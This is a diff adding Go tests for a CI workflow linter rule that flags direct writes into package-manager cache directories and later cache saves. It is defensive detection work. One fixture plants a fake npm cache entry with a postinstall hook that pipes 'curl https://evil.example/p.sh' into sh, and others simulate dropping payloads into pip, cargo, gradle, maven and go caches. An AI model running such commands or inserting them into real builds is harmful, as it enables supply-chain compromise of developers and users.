@@ -1386,6 +1386,180 @@ func TestCachePoisoningRule_DirectCachePoison_CombinedWithIndirect(t *testing.T)
 	}
 }
 
+func TestCachePoisoningRule_DirectCacheDirectoryWrite(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name          string
+		script        string
+		wantErrors    int
+		wantSubstring string
+	}{
+		{
+			name: "mkdir writes npm cache directory",
+			script: `mkdir -p ~/.npm/_cacache/content-v2/sha512
+cat > ~/.npm/_cacache/content-v2/sha512/malicious <<'PAYLOAD'
+{"scripts":{"postinstall":"curl https://evil.example/p.sh | sh"}}
+PAYLOAD`,
+			wantErrors:    2,
+			wantSubstring: "~/.npm/_cacache",
+		},
+		{
+			name:          "mkdir writes npm cache directory without trailing slash",
+			script:        `mkdir -p ~/.npm/_cacache`,
+			wantErrors:    1,
+			wantSubstring: "~/.npm/_cacache",
+		},
+		{
+			name:          "cp writes pip cache directory",
+			script:        `cp payload.whl ~/.cache/pip/wheels/payload.whl`,
+			wantErrors:    1,
+			wantSubstring: "~/.cache/pip",
+		},
+		{
+			name:          "mkdir writes cargo registry cache",
+			script:        `mkdir -p ~/.cargo/registry/src/malicious`,
+			wantErrors:    1,
+			wantSubstring: "~/.cargo/registry",
+		},
+		{
+			name:          "touch writes gradle cache",
+			script:        `touch ~/.gradle/caches/modules-2/files-2.1/payload`,
+			wantErrors:    1,
+			wantSubstring: "~/.gradle/caches",
+		},
+		{
+			name:          "printf redirects into maven repository cache",
+			script:        `printf '%s\n' payload > ~/.m2/repository/com/example/payload.jar`,
+			wantErrors:    1,
+			wantSubstring: "~/.m2/repository",
+		},
+		{
+			name:          "install writes go module cache",
+			script:        `install -D payload ~/go/pkg/mod/cache/download/example.com/mod/@v/v1.0.0.zip`,
+			wantErrors:    1,
+			wantSubstring: "~/go/pkg/mod/cache",
+		},
+		{
+			name:          "package manager cache command is not direct write",
+			script:        `npm cache verify`,
+			wantErrors:    0,
+			wantSubstring: "",
+		},
+		{
+			name:          "cache directory read is not direct write",
+			script:        `ls ~/.npm/_cacache/content-v2/sha512`,
+			wantErrors:    0,
+			wantSubstring: "",
+		},
+		{
+			name:          "echoing cache directory path is not direct write",
+			script:        `echo ~/.npm/_cacache/content-v2/sha512`,
+			wantErrors:    0,
+			wantSubstring: "",
+		},
+		{
+			name:          "cat reads cache directory file without redirection",
+			script:        `cat ~/.npm/_cacache/content-v2/sha512/cache-entry`,
+			wantErrors:    0,
+			wantSubstring: "",
+		},
+		{
+			name:          "copying from cache directory is not direct write",
+			script:        `cp ~/.cache/pip/wheels/pkg.whl ./pkg.whl`,
+			wantErrors:    0,
+			wantSubstring: "",
+		},
+		{
+			name:          "sibling directory with similar prefix is not cache directory",
+			script:        `mkdir -p ~/.npm/_cacache-old`,
+			wantErrors:    0,
+			wantSubstring: "",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+
+			rule := NewCachePoisoningRule()
+			workflow := &ast.Workflow{
+				On: []ast.Event{
+					&ast.WebhookEvent{Hook: &ast.String{Value: "push"}},
+				},
+			}
+			_ = rule.VisitWorkflowPre(workflow)
+			_ = rule.VisitJobPre(&ast.Job{})
+
+			step := &ast.Step{
+				Pos: &ast.Position{Line: 10, Col: 1},
+				Exec: &ast.ExecRun{
+					Run: &ast.String{
+						Value: tt.script,
+						Pos:   &ast.Position{Line: 11, Col: 9},
+					},
+				},
+			}
+			_ = rule.VisitStep(step)
+
+			errors := rule.Errors()
+			if len(errors) != tt.wantErrors {
+				t.Fatalf("Expected %d errors, got %d: %#v", tt.wantErrors, len(errors), errors)
+			}
+			if tt.wantSubstring != "" && !strings.Contains(errors[0].Description, tt.wantSubstring) {
+				t.Fatalf("Expected error to contain %q, got %q", tt.wantSubstring, errors[0].Description)
+			}
+		})
+	}
+}
+
+func TestCachePoisoningRule_DirectCacheDirectoryWriteBeforeCacheSave(t *testing.T) {
+	t.Parallel()
+
+	rule := NewCachePoisoningRule()
+	workflow := &ast.Workflow{
+		On: []ast.Event{
+			&ast.WebhookEvent{Hook: &ast.String{Value: "push"}},
+		},
+	}
+	_ = rule.VisitWorkflowPre(workflow)
+	_ = rule.VisitJobPre(&ast.Job{})
+
+	writeStep := &ast.Step{
+		Pos: &ast.Position{Line: 10, Col: 1},
+		Exec: &ast.ExecRun{
+			Run: &ast.String{
+				Value: `echo "payload" >> ~/.npm/_cacache/content-v2/sha512/malicious`,
+				Pos:   &ast.Position{Line: 11, Col: 9},
+			},
+		},
+	}
+	_ = rule.VisitStep(writeStep)
+
+	saveStep := &ast.Step{
+		Pos: &ast.Position{Line: 12, Col: 1},
+		Exec: &ast.ExecAction{
+			Uses: &ast.String{Value: "actions/cache/save@v4"},
+			Inputs: map[string]*ast.Input{
+				"path": {Value: &ast.String{Value: "~/.npm", Pos: &ast.Position{Line: 14, Col: 15}}},
+				"key":  {Value: &ast.String{Value: "npm-${{ github.sha }}", Pos: &ast.Position{Line: 15, Col: 14}}},
+			},
+		},
+	}
+	_ = rule.VisitStep(saveStep)
+
+	errors := rule.Errors()
+	if len(errors) != 2 {
+		t.Fatalf("Expected direct write and cache save errors, got %d: %#v", len(errors), errors)
+	}
+	if !strings.Contains(errors[1].Description, "actions/cache/save follows direct writes") {
+		t.Fatalf("Expected cache save follow-up warning, got %q", errors[1].Description)
+	}
+	if !strings.Contains(errors[1].Description, "~/.npm/_cacache") {
+		t.Fatalf("Expected cache save warning to mention cache directory, got %q", errors[1].Description)
+	}
+}
+
 // Tests for new cache poisoning patterns (predictable keys, release workflows)
 
 func TestCachePoisoningRule_PredictableCacheKey(t *testing.T) {
